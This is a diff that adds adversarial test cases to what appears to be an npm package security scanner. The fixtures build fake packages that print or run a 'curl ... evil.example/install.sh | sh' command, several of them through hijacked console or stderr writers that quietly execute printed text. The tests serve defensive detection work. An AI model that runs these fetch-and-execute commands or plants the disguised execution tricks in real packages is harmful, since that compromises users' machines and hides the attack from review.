@@ -235,6 +235,91 @@ CASES["xctl_fn_export"] = pkg({
 CASES["xctl_tpl_line"] = pkg({
     "index.js": f"const H = {Q};\nmodule.exports = {{ H }};\nconsole.log(`Run: ${{H}}`);\n"})
 
+# (e) An MCP stdio entry point elsewhere in the package routes console / stdout to stderr
+# (atomicstrata/atomicmemory, 2026-10-28). The hint line keeps the `--proto '=https'`
+# single quotes inside a double-quoted string, as printed by the real installer.
+PROTO = "curl --proto '=https' --tlsv1.2 -fsSL https://evil.example/install.sh | sh"
+PROTO_LINE = f'  console.log("  {PROTO}");\n'
+STDIO = ("import { Console } from 'node:console';\n"
+         "function routeConsoleToStderr() {\n"
+         "  const stderrConsole = new Console({ stdout: process.stderr, stderr: process.stderr });\n"
+         "  console.log = stderrConsole.log.bind(stderrConsole);\n"
+         "  console.info = stderrConsole.info.bind(stderrConsole);\n"
+         "}\n"
+         "function routeStdout() {\n"
+         "  const originalWrite = process.stdout.write.bind(process.stdout);\n"
+         "  process.stdout.write = ((chunk, encodingOrCallback, callback) => {\n"
+         "    const done = typeof encodingOrCallback === 'function' ? encodingOrCallback : callback;\n"
+         "    process.stderr.write(typeof chunk === 'string' ? chunk : Buffer.from(chunk).toString());\n"
+         "    if (typeof done === 'function') {\n"
+         "      queueMicrotask(() => done());\n"
+         "    }\n"
+         "    return true;\n"
+         "  });\n"
+         "  return originalWrite;\n"
+         "}\n"
+         "export function runStdio() {\n  routeConsoleToStderr();\n  return routeStdout();\n}\n")
+CP_ESM = "import { execSync, spawn } from 'node:child_process';\n"
+
+
+def _installer(extra=""):
+    return ("import { mkdirSync } from 'node:fs';\n" + CP_ESM
+            + "function printNextSteps(target) {\n"
+            "  mkdirSync(target, { recursive: true });\n"
+            "  console.log('Next:');\n" + PROTO_LINE + extra + "}\n"
+            "printNextSteps(process.argv[2]);\n")
+
+
+CASES["ctl_stderr_routed_printed_hint"] = pkg({
+    "stdio.mjs": STDIO,
+    "install.mjs": ("import { mkdirSync } from 'node:fs';\n"
+                    "function printNextSteps(target) {\n"
+                    "  mkdirSync(target, { recursive: true });\n"
+                    "  console.log('Next:');\n" + PROTO_LINE + "}\n"
+                    "printNextSteps(process.argv[2]);\n")}, main="install.mjs")
+CASES["e_stderr_routed_hint_execsync"] = pkg({
+    "stdio.mjs": STDIO,
+    "install.mjs": _installer(f'  execSync("{PROTO}");\n')}, main="install.mjs")
+CASES["e_stderr_routed_hint_spawn_sh"] = pkg({
+    "stdio.mjs": STDIO,
+    "install.mjs": _installer(f"  spawn('sh', ['-c', \"{PROTO}\"], {{ stdio: 'inherit' }});\n")},
+    main="install.mjs")
+# No routing at all: a string after a comma in an array literal was classified as
+# soon as the walk saw the comma (fixed 2026-10-28).
+CASES["e_execfilesync_array_element"] = pkg({
+    "install.mjs": "import { execFileSync } from 'node:child_process';\n"
+                   f"console.log(\"{PROTO}\");\nexecFileSync('sh', ['-c', \"{PROTO}\"]);\n"},
+    main="install.mjs")
+# The same routing shape, but the bound console's method is replaced first.
+CASES["e_stderr_console_method_patched"] = pkg({
+    "stdio.mjs": STDIO.replace(
+        "  console.log = stderrConsole.log",
+        "  stderrConsole.log = (s) => execSync(s);\n  console.log = stderrConsole.log").replace(
+        "import { Console } from 'node:console';\n",
+        "import { Console } from 'node:console';\n" + CP_ESM),
+    "install.mjs": "import './stdio.mjs';\n" + _installer().replace(CP_ESM, "")},
+    main="install.mjs")
+# The routing shape over a Writable whose write() runs its input.
+CASES["e_stderr_console_exec_writable"] = pkg({
+    "stdio.mjs": "import { Console } from 'node:console';\n"
+                 "import { Writable } from 'node:stream';\n" + CP_ESM
+                 + "const sink = new Writable({ write(chunk, enc, cb) { "
+                   "execSync(String(chunk)); cb(); } });\n"
+                   "const c = new Console({ stdout: sink });\n"
+                   "console.log = c.log.bind(c);\n",
+    "install.mjs": "import './stdio.mjs';\n" + _installer().replace(CP_ESM, "")},
+    main="install.mjs")
+# The redirect target itself hijacked: the stdio file is the benign shape, a third file
+# replaces process.stderr.write, the printed hint lives in install.mjs.
+CASES["e_stderr_target_hijacked"] = pkg({
+    "stdio.mjs": STDIO,
+    "hook.mjs": CP_ESM + "process.stderr.write = (s) => execSync(s);\n",
+    "install.mjs": "import { mkdirSync } from 'node:fs';\n"
+                   "function printNextSteps(target) {\n"
+                   "  mkdirSync(target, { recursive: true });\n"
+                   "  console.log('Next:');\n" + PROTO_LINE + "}\n"
+                   "printNextSteps(process.argv[2]);\n"}, main="install.mjs")
+
 
 def run(files):
     fetched = npm_result_from_tarball("adv-case", "1.0.0", tgz(files))
